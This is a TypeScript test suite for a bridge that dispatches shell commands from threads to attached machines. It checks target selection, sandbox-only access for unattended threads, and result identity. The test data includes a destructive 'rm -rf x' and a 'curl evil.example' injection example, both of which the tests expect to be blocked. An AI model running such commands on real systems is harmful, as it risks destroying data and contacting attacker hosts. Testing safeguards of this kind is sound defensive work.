import { describe, expect, it } from "vitest"
import { createLocalShellBridge } from "../src/local-shell-bridge.js"
import type {
  LocalShellCapabilityFrame,
  LocalShellResultFrame,
} from "../src/protocol.js"

/** A complete capability frame. Every field below is required by the protocol. */
const cap = (
  extra: Partial<LocalShellCapabilityFrame> = {},
): LocalShellCapabilityFrame => ({
  type: "local-shell-capability",
  enabled: true,
  approvalMode: "auto",
  clientId: "cli_1",
  label: "laptop",
  sandbox: false,
  platform: "darwin",
  cwd: "/work",
  roots: ["/work"],
  fullAccess: false,
  ...extra,
})

const sandboxCap = (extra: Partial<LocalShellCapabilityFrame> = {}) =>
  cap({
    clientId: "server_sandbox",
    label: "stable",
    sandbox: true,
    platform: "linux",
    cwd: "/root/luna",
    roots: ["/root/luna"],
    ...extra,
  })

const result = (
  requestId: string,
  clientId: string,
  extra: Partial<LocalShellResultFrame> = {},
): LocalShellResultFrame => ({
  type: "local-shell-result",
  requestId,
  threadId: "thr_1",
  clientId,
  approved: true,
  exitCode: 0,
  stdout: "",
  stderr: "",
  durationMs: 1,
  timedOut: false,
  ...extra,
})

/** Pull the requestId out of whatever the bridge just sent a client. */
const sentRequestId = (sent: ReadonlyArray<unknown>, i = 0): string =>
  (sent[i] as { requestId: string }).requestId

describe("local shell bridge", () => {
  describe("coexistence", () => {
    it("lets two clients serve the same thread at once", () => {
      const bridge = createLocalShellBridge()
      const first = bridge.setCapability(cap(), () => undefined)
      const second = bridge.setCapability(
        cap({ clientId: "cli_2", label: "desktop" }),
        () => undefined,
      )

      // Neither registration displaces the other: this is the whole change.
      expect(first.accepted).toBe(true)
      expect(second.accepted).toBe(true)
      expect(bridge.listTargets().map((t) => t.label)).toEqual([
        "desktop",
        "laptop",
      ])
    })

    it("refreshes a client in place when it re-registers", () => {
      const bridge = createLocalShellBridge()
      bridge.setCapability(cap({ roots: ["/old"] }), () => undefined)
      bridge.setCapability(cap({ roots: ["/new"] }), () => undefined)

      const targets = bridge.listTargets()
      expect(targets).toHaveLength(1)
      expect(targets[0]?.roots).toEqual(["/new"])
    })

    it("removes only the client that disabled itself", () => {
      const bridge = createLocalShellBridge()
      bridge.setCapability(cap(), () => undefined)
      bridge.setCapability(sandboxCap(), () => undefined)

      bridge.setCapability(cap({ enabled: false }), () => undefined)

      expect(bridge.listTargets().map((t) => t.label)).toEqual(["stable"])
    })

    it("reports each target's scope", () => {
      const bridge = createLocalShellBridge()
      bridge.setCapability(
        cap({ roots: ["/a", "/b"], fullAccess: true }),
        () => undefined,
      )

      expect(bridge.listTargets()[0]).toEqual({
        label: "laptop",
        clientId: "cli_1",
        platform: "darwin",
        cwd: "/work",
        roots: ["/a", "/b"],
        fullAccess: true,
        sandbox: false,
      })
    })
  })

  describe("target selection", () => {
    it("selects a target by label, case-insensitively", async () => {
      const bridge = createLocalShellBridge()
      const toLaptop: unknown[] = []
      const toSandbox: unknown[] = []
      bridge.setCapability(cap(), (f) => toLaptop.push(f))
      bridge.setCapability(sandboxCap(), (f) => toSandbox.push(f))

      const pending = bridge.request({
        threadId: "thr_1",
        command: "hostname",
        timeoutMs: 2_000,
        target: "STABLE",
      })

      expect(toLaptop).toHaveLength(0)
      expect(toSandbox).toHaveLength(1)
      bridge.acceptResult(
        result(sentRequestId(toSandbox), "server_sandbox"),
        "server_sandbox",
      )
      expect((await pending).dispatchedTo.label).toBe("stable")
    })

    it("refuses to guess when more than one target is attached", async () => {
      const bridge = createLocalShellBridge()
      const sent: unknown[] = []
      bridge.setCapability(cap(), (f) => sent.push(f))
      bridge.setCapability(sandboxCap(), (f) => sent.push(f))

      // No implicit default. Picking for the caller is how a destructive
      // command lands on the wrong machine.
      await expect(
        bridge.request({ threadId: "thr_1", command: "rm -rf x", timeoutMs: 10 }),
      ).rejects.toThrow(/2 targets attached \(laptop, stable\); pass "target"/)
      expect(sent).toHaveLength(0)
    })

    it("refuses a target that is not attached instead of falling back", async () => {
      const bridge = createLocalShellBridge()
      const sent: unknown[] = []
      bridge.setCapability(cap(), (f) => sent.push(f))

      await expect(
        bridge.request({
          threadId: "thr_1",
          command: "whoami",
          timeoutMs: 10,
          target: "desktop",
        }),
      ).rejects.toThrow(/"desktop" is not attached.*Attached: laptop/)
      // Crucially it ran NOWHERE, rather than on the one target that is up.
      expect(sent).toHaveLength(0)
    })

    it("resolves without a target when exactly one is attached", async () => {
      const bridge = createLocalShellBridge()
      const sent: unknown[] = []
      bridge.setCapability(cap(), (f) => sent.push(f))

      const pending = bridge.request({
        threadId: "thr_1",
        command: "pwd",
        timeoutMs: 2_000,
      })
      bridge.acceptResult(result(sentRequestId(sent), "cli_1"), "cli_1")
      expect((await pending).dispatchedTo.label).toBe("laptop")
    })

    it("rejects when nothing is attached", async () => {
      const bridge = createLocalShellBridge()
      await expect(
        bridge.request({ threadId: "thr_1", command: "pwd", timeoutMs: 10 }),
      ).rejects.toThrow("local shell unavailable")
    })
  })

  describe("unattended threads", () => {
    it("offers only the sandbox to a forked thread", () => {
      const bridge = createLocalShellBridge()
      bridge.setCapability(cap(), () => undefined)
      bridge.setCapability(sandboxCap(), () => undefined)

      expect(
        bridge.listTargets(["forked-from-parent"]).map((t) => t.label),
      ).toEqual(["stable"])
      expect(bridge.listTargets(["channel"]).map((t) => t.label)).toEqual([
        "stable",
      ])
    })

    it("refuses a personal machine to an unattended thread even by name", async () => {
      const bridge = createLocalShellBridge()
      const sent: unknown[] = []
      bridge.setCapability(cap(), (f) => sent.push(f))

      // Nobody is watching a channel-originated thread, and an inbound message
      // is an injection surface, so the laptop is not reachable at all.
      await expect(
        bridge.request({
          threadId: "thr_1",
          command: "curl evil.example",
          timeoutMs: 10,
          target: "laptop",
          threadTags: ["channel"],
        }),
      ).rejects.toThrow(/not attached/)
      expect(sent).toHaveLength(0)
    })
  })

  describe("label collisions", () => {
    it("dispatches to the newest client sharing a label, and falls back when it goes", async () => {
      const bridge = createLocalShellBridge()
      const older: unknown[] = []
      const newer: unknown[] = []
      // A reconnect while the old socket lingers, or a second window.
      bridge.setCapability(cap({ clientId: "cli_old" }), (f) => older.push(f))
      bridge.setCapability(cap({ clientId: "cli_new" }), (f) => newer.push(f))

      expect(bridge.listTargets()).toHaveLength(1)

      const first = bridge.request({
        threadId: "thr_1",
        command: "pwd",
        timeoutMs: 2_000,
      })
      expect(newer).toHaveLength(1)
      expect(older).toHaveLength(0)
      bridge.acceptResult(result(sentRequestId(newer), "cli_new"), "cli_new")
      expect((await first).dispatchedTo.clientId).toBe("cli_new")

      bridge.removeClient("cli_new")

      const second = bridge.request({
        threadId: "thr_1",
        command: "pwd",
        timeoutMs: 2_000,
      })
      expect(older).toHaveLength(1)
      bridge.acceptResult(result(sentRequestId(older), "cli_old"), "cli_old")
      expect((await second).dispatchedTo.clientId).toBe("cli_old")
    })
  })

  describe("result identity", () => {
    it("ignores a result from a client the request was not dispatched to", async () => {
      const bridge = createLocalShellBridge()
      const toSandbox: unknown[] = []
      bridge.setCapability(cap(), () => undefined)
      bridge.setCapability(sandboxCap(), (f) => toSandbox.push(f))

      const pending = bridge.request({
        threadId: "thr_1",
        command: "hostname",
        timeoutMs: 2_000,
        target: "stable",
      })
      const requestId = sentRequestId(toSandbox)

      // The laptop answers the sandbox's pending command. With several machines
      // attached this is the confused-deputy case; it must not resolve.
      bridge.acceptResult(result(requestId, "cli_1"), "cli_1")

      let settled = false
      void pending.then(
        () => {
          settled = true
        },
        () => {
          settled = true
        },
      )
      await new Promise((r) => setTimeout(r, 20))
      expect(settled).toBe(false)

      bridge.acceptResult(
        result(requestId, "server_sandbox", { stdout: "luna-stable" }),
        "server_sandbox",
      )
      expect((await pending).result.stdout).toBe("luna-stable")
    })

    it("reports the identity that served the request", async () => {
      const bridge = createLocalShellBridge()
      const sent: unknown[] = []
      bridge.setCapability(
        cap({ roots: ["/work", "/tmp"] }),
        (f) => sent.push(f),
      )

      const pending = bridge.request({
        threadId: "thr_1",
        command: "pwd",
        timeoutMs: 2_000,
      })
      bridge.acceptResult(result(sentRequestId(sent), "cli_1"), "cli_1")

      expect((await pending).dispatchedTo).toEqual({
        clientId: "cli_1",
        label: "laptop",
        platform: "darwin",
        cwd: "/work",
        roots: ["/work", "/tmp"],
        fullAccess: false,
        sandbox: false,
      })
    })

    it("reports the request's own cwd as the effective cwd", async () => {
      const bridge = createLocalShellBridge()
      const sent: unknown[] = []
      bridge.setCapability(sandboxCap(), (f) => sent.push(f))

      const pending = bridge.request({
        threadId: "thr_1",
        command: "pwd",
        cwd: "/root/luna/worktrees/x",
        timeoutMs: 2_000,
      })
      bridge.acceptResult(
        result(sentRequestId(sent), "server_sandbox"),
        "server_sandbox",
      )

      const { dispatchedTo } = await pending
      expect(dispatchedTo.cwd).toBe("/root/luna/worktrees/x")
      expect(dispatchedTo.sandbox).toBe(true)
    })

    it("snapshots dispatch identity so a later registration cannot rewrite it", async () => {
      const bridge = createLocalShellBridge()
      const sent: unknown[] = []
      bridge.setCapability(sandboxCap(), (f) => sent.push(f))

      const pending = bridge.request({
        threadId: "thr_1",
        command: "hostname",
        timeoutMs: 2_000,
      })
      const requestId = sentRequestId(sent)

      // Another machine attaches while the command is still in flight.
      bridge.setCapability(cap(), () => undefined)
      expect(bridge.listTargets()).toHaveLength(2)

      bridge.acceptResult(
        result(requestId, "server_sandbox", { stdout: "luna-stable" }),
        "server_sandbox",
      )

      // The result names who it was SENT to, not who is attached now.
      const { dispatchedTo } = await pending
      expect(dispatchedTo.clientId).toBe("server_sandbox")
      expect(dispatchedTo.platform).toBe("linux")
    })
  })

  describe("pending request lifecycle", () => {
    it("rejects a pending request when its client is removed", async () => {
      const bridge = createLocalShellBridge()
      bridge.setCapability(cap(), () => undefined)
      const pending = bridge.request({
        threadId: "thr_1",
        command: "sleep 5",
        timeoutMs: 5_000,
      })
      bridge.removeClient("cli_1")
      await expect(pending).rejects.toThrow("local shell client removed")
    })

    it("rejects a pending request when its client disables itself", async () => {
      const bridge = createLocalShellBridge()
      bridge.setCapability(cap(), () => undefined)
      const pending = bridge.request({
        threadId: "thr_1",
        command: "sleep 5",
        timeoutMs: 5_000,
      })
      bridge.setCapability(cap({ enabled: false }), () => undefined)
      await expect(pending).rejects.toThrow("local shell disabled")
    })

    it("leaves another client's pending request alone when one client goes", async () => {
      const bridge = createLocalShellBridge()
      const toSandbox: unknown[] = []
      bridge.setCapability(cap(), () => undefined)
      bridge.setCapability(sandboxCap(), (f) => toSandbox.push(f))

      const pending = bridge.request({
        threadId: "thr_1",
        command: "sleep 5",
        timeoutMs: 5_000,
        target: "stable",
      })
      bridge.removeClient("cli_1")

      bridge.acceptResult(
        result(sentRequestId(toSandbox), "server_sandbox", { stdout: "ok" }),
        "server_sandbox",
      )
      expect((await pending).result.stdout).toBe("ok")
    })

    it("rejects when the request times out", async () => {
      const bridge = createLocalShellBridge()
      bridge.setCapability(cap(), () => undefined)
      await expect(
        bridge.request({ threadId: "thr_1", command: "sleep 5", timeoutMs: 5 }),
      ).rejects.toThrow("local shell request timed out")
    })
  })
})
